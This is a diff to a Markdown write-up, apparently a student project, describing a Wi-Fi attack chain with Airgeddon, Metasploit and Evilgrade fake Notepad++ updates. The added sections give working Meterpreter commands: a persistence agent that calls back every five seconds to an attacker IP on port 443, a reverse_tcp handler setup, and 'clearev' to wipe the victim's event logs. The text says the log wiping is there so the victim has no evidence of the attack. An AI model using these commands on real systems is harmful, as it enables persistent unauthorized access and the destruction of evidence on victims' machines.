@@ -3,6 +3,15 @@ Wireless Hacking will be more efficient if we know the attack flow of the target
 
 Airgeddon is written in bash and multi-use for Linux system to audit wireless networks and developed by V1s1t0rsh3r3. Evilgrade is a modular framework that allows the user to take advantage of poor upgrade implementations by injecting fake updates.
 
+## Summary
+* [Attacking Procedures](#attacking-procedures)
+* [1. Reconnaissance and Scanning](#reconnaissance-and-scanning)
+* [2. Gaining Access](#gaining-access)
+     * [1st STEP : Password cracking by using Airgeddon](#1st-step:-password-cracking-by-using-airgeddon )
+     * [2nd STEP : Create a reverse shell trojan using Metasploit](#2nd-step:-create-a-reverse-shell-trojan-using-metasploit)
+     * [3rd STEP : create a notepadplus module and spoof notepad++ website using Evilgrade](#3rd-step:-create-a-notepadplus-module-and-spoof-notepad++-website-using-Evilgrade)
+     * [4th STEP : build a meterpreter shell in the kali linux using Metasploit](#4th STEP : build a meterpreter shell in the kali linux using Metasploit)
+
 ## Attacking Procedures
 ### 1. Reconnaissance and Scanning
 ![image](https://user-images.githubusercontent.com/86700132/127674455-aa069a9b-2705-4043-a6c0-edc3b64eb545.png)
@@ -41,6 +50,7 @@ Next step, select the deauth / disassoc amok mdk3 attack which is option 1 and w
 ![image](https://user-images.githubusercontent.com/86700132/127675907-a65d30ea-9ccf-409a-a236-7033a8dd610d.png)
 
 The script will ask whether you get the handshake or not, insert y and press enter if you successful get the handshake which we will using it to perform wireless attack. Last, return to main menu and prepare for gaining access.
+
 
 
 ### 2. Gaining Access
@@ -244,3 +254,69 @@ Back to the Metasploit, the diagram below shows that the targeted machine is lis
 ![image](https://user-images.githubusercontent.com/86700132/127680150-c577091e-a085-480c-bb9b-0badc1f68534.png)
 
 
+
+### 3. Maintaining Access
+In this stage, we have finally access to the targeted machine. We configure the persistence in meterpreter shell to have a permanent automatic connection to targeted machine in targeted machine background. Once we set the persistence into the targeted machine, we can access the targeted machine by just waiting victim to connect the port of our attack machine. Then, if targeted machine disconnects to our port, we can just type command "exploit" and wait for targeted machine connect to port of our attack machine again. 
+
+Now, we type the following command to configure a persistence meterpreter session. This persistence meterpreter session will wait until victim turn on his/her targeted machine and try to connect back to meterpreter shell for every 5 seconds to out attack machine on port 443.
+```
+meterpreter > run persistence –U –i 5 –p 443 –r 192.168.144.142
+```
+-U        Automatically start the agent when the User logs on
+
+-i	The interval in seconds between each connection attempt
+
+-p	The port on which the system running Metasploit is listening
+
+-r	The IP of the system running Metasploit listening for the connect back
+
+Let's try whether we can permanently connect to targeted machine. Type command:
+```
+exit
+```
+
+Then type command:
+```
+msf exploit(handler) > use multi/handler
+
+msf exploit(handler) > set lhost 192.168.144.142
+
+msf exploit(handler) > set lport 443
+
+msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
+
+msf exploit(handler) > exploit
+```
+
+Diagram below shows that we can connect to targeted machine again. This prove that we can permanently connect to targeted machine if the targeted machine is log on.
+
+![image](https://user-images.githubusercontent.com/86700132/127680747-b3158fbf-d070-4c65-a77f-9f4f78f463e3.png)
+
+
+### 4. Clearing Track
+In the last stage, of course, we need to clear the trace of our attack to targeted machine. This is very important because once we clear our trace, victim do not know his/her machine is being attack and once he/she detect our attack, he/she do not have evidences to prove it.
+
+We type command below to clear the event logs of targeted machine so that our trace will be clear also. However, this will force the application executing in targeted machine to close too. 
+```
+clearev
+```
+![image](https://user-images.githubusercontent.com/86700132/127680886-91d7bad5-fd33-4648-9605-9a15ff0db236.png)
+
+
+## References
+* [Take precautions on public Wi-Fi](https://www.thestar.com.my/news/nation/2016/08/01/take-precautions-on-public-wifi-cybersecurity-firm-hackers-can-gather-sensitive-data-via-unsecure-co/)
+* [Hack Like a Pro: How to Cover Your Tracks & Leave No Trace Behind on the Target System](https://null-byte.wonderhowto.com/how-to/hack-like-pro-cover-your-tracks-leave-no-trace-behind-target-system-0148123/)
+* [Severe WiFi security flaw puts millions of devices at risk](https://www.engadget.com/2017/10/16/wifi-vulnerability-krack-attack/)
+* [Hackers used luxury hotel Wi-Fi to steal business executive's data, researchers say.](https://www.theguardian.com/technology/2014/nov/10/hotel-wi-fi-infected-business-travellers-asia-kaspersky)
+* [Infobyte/evilgrade](https://github.com/infobyte/evilgrade)
+* [Video: How to Crack Weak Wi-Fi Passwords in Seconds with Airgeddon on Parrot OS](https://null-byte.wonderhowto.com/how-to/video-crack-weak-wi-fi-passwords-seconds-with-airgeddon-parrot-os-0181434/)
+* [Meterpreter Service](https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/)
+* [AIRGEDDON - Crack Encrypted WPA/WPA2 WiFi Key Password](https://thehacktoday.com/airgeddon-crack-encrypted-wpa-wpa2-wifi-password/)
+* [Hacking with Evilgrade](https://www.youtube.com/watch?v=nReKwL93Fnk)
+* [Hacking with Evilgrade2](https://pastebin.com/BAs4uXVL)
+* [V1s1t0r1sh3r3/airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon)
+
+## Credits
+1.	Siew Kar Soon
+2.	Chin Chee Hoong
+3. Wong Zhen Ren
